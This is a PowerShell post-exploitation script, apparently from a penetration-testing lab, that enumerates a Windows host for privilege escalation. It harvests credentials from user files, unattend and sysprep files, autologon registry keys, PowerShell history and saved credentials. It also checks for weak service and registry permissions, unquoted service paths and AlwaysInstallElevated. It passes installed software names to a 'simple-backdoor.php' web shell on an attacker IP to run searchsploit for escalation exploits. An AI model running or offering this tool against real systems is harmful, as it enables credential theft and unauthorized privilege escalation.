mkdir C:\Windows\Temp\test

$remote_check = "10.10.16.47"

function print_output($command){ 
  Write-Output " "
  Write-Output " "
  print_head($command)
  Write-Output "#    $command     #"
  print_head($command)
}

function print_head($command){ 
  $str = ""
  For ($i=0; $i -le $command.length + 10; $i++) {
    $str+="#"
  }
  Write-Output $str

}


function Is-ThisNumeric ($Value) {
  return $Value -match "^[\d\.]+$"
}

function Get-NetworkStatistics($customparam1=" ", $customparam2=" ")
{
 $properties = 'Protocol','LocalAddress','LocalPort'
 $properties += 'RemoteAddress','RemotePort','State','ProcessName','PID'

 netstat -ano |Select-String -Pattern '\s+(TCP|UDP)'  | Select-String $customparam1 | Select-String $customparam2 | ForEach-Object {

   $item = $_.line.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)

   if($item[1] -notmatch '^\[::')
   {
     if (($la = $item[1] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6')
     {
       $localAddress = $la.IPAddressToString
       $localPort = $item[1].split('\]:')[-1]
     }
     else
     {
       $localAddress = $item[1].split(':')[0]
       $localPort = $item[1].split(':')[-1]
     }

     if (($ra = $item[2] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6')
     {
       $remoteAddress = $ra.IPAddressToString
       $remotePort = $item[2].split('\]:')[-1]
     }
     else
     {
       $remoteAddress = $item[2].split(':')[0]
       $remotePort = $item[2].split(':')[-1]
     }

     New-Object PSObject -Property @{
       PID = $item[-1]
       ProcessName = (Get-Process -Id $item[-1] -ErrorAction SilentlyContinue).Name
       Protocol = $item[0]
       LocalAddress = $localAddress
       LocalPort = $localPort
       RemoteAddress =$remoteAddress
       RemotePort = $remotePort
       State = if($item[0] -eq 'tcp') {$item[3]} else {$null}
       } |Select-Object -Property $properties
     }
   }
 }


 function Get-OthersProcessStatistics
 {
   $properties = 'PID','ProcessName','ProcessPath', 'Status'

   tasklist /v  /fi "username ne $env:UserName" /fi "imagename ne smss.exe" /fi "imagename ne csrss.exe" /fi "imagename ne wininit.exe" /fi "imagename ne services.exe" /fi "imagename ne lsass.exe" /fi "imagename ne svchost.exe" /fi "imagename ne lsm.exe" /fi "imagename ne winlogon.exe" /fi "imagename ne explorer.exe" /fi "imagename ne System Idle Process" |Select-String -Pattern '\d+(?!.*\d+)'  | ForEach-Object {

     $item = $_.line.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)
     $item_id  = if(Is-ThisNumeric($item[1])) {$item[1]} else {$item[2]}
     New-Object PSObject -Property @{
       PID = if(Is-ThisNumeric($item[1])) {$item[1]} else {$item[2]}
       ProcessName = wmic service  where "ProcessId = $item_id" get Name
       ProcessPath = wmic service  where "ProcessId = $item_id" get PathName
       Status = wmic service  where "ProcessId = $item_id" get State
       } |Select-Object -Property $properties
     }
   }


   function IsWritable($path_to_check){ 

    $myuser = $env:UserName;
    $value_to_return = $false;

    if ((Get-Acl $path_to_check).access | ft | Out-String | findStr $myuser | Select-String -Pattern "Allow" |Select-String "(FullControl)|(Modify)|(Write)") {return $true;}

    $groups = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups).Value | foreach-Object{
      $objSID = New-Object System.Security.Principal.SecurityIdentifier ($_); Write-Output ($objSID.Translate( [System.Security.Principal.NTAccount])).Value
    }

    $groups | ForEach-Object {
      $groupeName=$_;
      
      (Get-Acl $path_to_check).access | ForEach-Object{

        if ( $_ | ft | Out-String | Select-String -Pattern "Allow" | Select-String -Pattern $groupeName.replace("\","\\") | Select-String "(FullControl)|(Modify)|(Write)") {$value_to_return=$true; } 
      }
    }
    return $value_to_return;
  }



  print_output("System detail")
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"


  print_output("List all env variables")
  Get-ChildItem Env: | ft Key,Value

  print_output("Listing drive")
  Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

  print_output("Current user Local Group")

 $groups = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups).Value | foreach-Object{
      $objSID = New-Object System.Security.Principal.SecurityIdentifier ($_); Write-Output ($objSID.Translate( [System.Security.Principal.NTAccount])).Value
    }

  Write-Output $groups

  print_output("Checking Administrator group member")
  Get-LocalGroupMember Administrators   -ErrorAction SilentlyContinue  | ft Name, PrincipalSource 
  Get-LocalGroupMember Administrateurs  -ErrorAction SilentlyContinue  | ft Name, PrincipalSource

  print_output("Checking Impersonate Privilege")
  whoami /priv | Select-String -Pattern '(SeSystemEnvironmentPrivilege)|(SeAssignPrimaryPrivilege)|(SeTcbPrivilege)|(SeBackupPrivilege)|(SeRestorePrivilege)|(SeCreateTokenPrivilege)|(SeLoadDriverPrivilege)|(SeTakeOwnershipPrivilege)|(SeDebugPrivilege)' | Select-String -Pattern 'Enabled'

  print_output("Checking Computer Users")
  Get-LocalUser | ft Name,Enabled,LastLogon

  print_output("Checking computer information")
  net accounts

  print_output("Network addresses")
  Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

  print_output("Localhost listening connections")
  Get-NetworkStatistics -customparam1 "127.0.0.1" -customparam2 "LISTENING" | Format-Table

  print_output("Listening connections")
  Get-NetworkStatistics -customparam1 "LISTENING" | Format-Table

  print_output("Share listening")
  net share

  print_output("SNMP config")
  Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse 2> C:\Windows\Temp\test\null.txt

  $c_dir = $ENV:UserProfile;
  print_output("Looting for passwords in $c_dir")
  cd $c_dir
  findstr /SI /M 'user login pass pwd password key credential cred secret key'   *.xml *.ini *.txt | findStr /VI "^AppData"
  cmd /c "dir /S /B *user* == *login* == *pass* == *pwd* == *key* == *secret* == *cred* == *vnc* == *.config*" | findStr /V "AppData"

  print_output("Searching Password in  *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt")
  Get-Childitem -Path C:\ -Include *sysprep.inf,*sysprep.xml,*unattended.xml,*unattend.xml,*unattend.txt,configuration.* -File -Recurse -ErrorAction SilentlyContinue |ForEach-Object {Get-Content  $_   |  Select-String -Pattern 'Password'  }

  print_output("Checking IIS Web config")
  Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

  print_output("Checking content of C:\inetpub\wwwroot")
  Get-Childitem -Path C:\inetpub\wwwroot -ErrorAction SilentlyContinue


  print_output("Checking saved wifi ")
  cmd /c "netsh wlan show profile"
  #for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on

  print_output("Getting Auto-Login in Register")
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2> C:\windows\temp\test\null.txt  | findstr "DefaultUserName DefaultDomainName DefaultPassword" 

  print_output("PowerShell history")
  cat (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

  print_output("Getting listening process localy")
  Get-NetworkStatistics -customparam1 "127.0.0.1" -customparam2 "LISTENING"  | Format-Table

  print_output("Getting others listening process")
  Get-NetworkStatistics -customparam1 "127.0.0.1" -customparam2 "LISTENING"  | Format-Table

  print_output("Process running as another user")
  Get-OthersProcessStatistics

  print_output("Process running as current user")
  tasklist /v /fi "username eq $env:UserName" /fi "imagename ne smss.exe" /fi "imagename ne csrss.exe" /fi "imagename ne wininit.exe" /fi "imagename ne services.exe" /fi "imagename ne lsass.exe" /fi "imagename ne svchost.exe" /fi "imagename ne lsm.exe" /fi "imagename ne winlogon.exe" /fi "imagename ne explorer.exe" /fi "imagename ne System Idle Process"

  print_output("Software installed on the computer")
  Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"   | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize

  print_output("Software installed for the current user")
  Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"   | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize

  print_output("Non-Microsfot Software installed")
  Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"  | Where-Object{$_.Publisher -NotMatch "Microsoft Corporation"} | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate  |  foreach-Object {Write-Output ($_.DisplayName  + " | " + $_.DisplayVersion )} | sort | Get-Unique

  print_output("Searching Software exploit")
  $result =  Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"  | Where-Object{$_.Publisher -NotMatch "Microsoft Corporation"} | Select-Object DisplayName  |  foreach-Object {Write-Output $_.DisplayName} | sort | Get-Unique
  foreach ( $r in $result){  $search = $r.Split(" ")[0].replace('-', ' ') ; Write-Output "Searchsploit $search";   (Invoke-WebRequest -URI "http://$remote_check/simple-backdoor.php?cmd=searchsploit $search --colour | grep -i Escalation" -UseBasicParsing).content; Write-Output " "}

  print_output("Scheduled tasks")
  Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

  print_output("Startup tasks")
  wmic startup get caption,command

  print_output("Insecure services permissions")
  $myuser = $env:UserName

  wmic service  where "Not StartName  like '%$myuser%'" Get PathName | Get-Unique |  where {$_ -ne "" -and $_ -match ":"} | foreach {write-output ($_.replace('"', '').toLower().Substring(0, $_.IndexOf(".exe") + 4)) } | sort | Get-Unique



  print_output("Hijacked dll")
  $processes = @{}
  Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object {$processes[$_.handle] = $_.getowner().user}
  #Processes not owned by current user
  $a = $processes | findStr /V  $env:UserName
  $candidate_id = $a[3..$a.count]  | Where-Object {$_.Trim().Length -ne 0}

  #Filter processes having real path
  $processes = foreach ($c in $candidate_id) { Get-Process -ID $c  | Where-Object {$_.path}}

  print_output("PATH directories with weak permissions")
  $paths_name = (Get-WmiObject win32_service |  ?{$_.PathName -notmatch 'C:\\Windows\\System32\\'}).PathName
  $user_group = Get-LocalGroup 

  $b =  ForEach($i in ( Get-WmiObject win32_service |  ?{$_.PathName -notmatch 'C:\\Windows\\System32\\'} ) ){ write-output $i.PathName; (Get-Acl  ($i.PathName.replace('"', '')  -split "\/")[0]  ).Access | Select FileSystemRights,AccessControlType,IdentityReference; write-output "";}

  Write-Output $b | findStr /V "NT AUTHORITY\SYSTEM" | findStr /V "BUILTIN\Administrators"

  print_output("Checking Windows Subsystem for Linux")
  #wsl --list --verbose 
  Get-Childitem -Path C:\Windows\WinSxS -Include bash.exe -File -Recurse -ErrorAction SilentlyContinue

  print_output("Unquoted Service Paths")
  Get-WmiObject -Class win32_service -Property Name, DisplayName, PathName, StartMode   | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | Where-Object {-not $_.pathname.StartsWith("`"")} | Where-Object {-not $_.pathname.StartsWith("'")} | Where-Object {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -NotMatch "C:\\Windows\\"}

  print_output("Checking AlwaysInstallElevated in registry")
  Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
  Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

  print_output("Checking editabled item in HKLM:\SYSTEM\CurrentControlset")
  get-childitem HKLM:\SYSTEM\CurrentControlset | Select PSChildName | foreach-Object {
   $current_path=Write-Output ("HKLM:\SYSTEM\CurrentControlset\"+$_.PSChildName);
   if (IsWritable($current_path)) { Write-Output $current_path}
 }


 print_output("Checking Runas")
 cmdkey /list

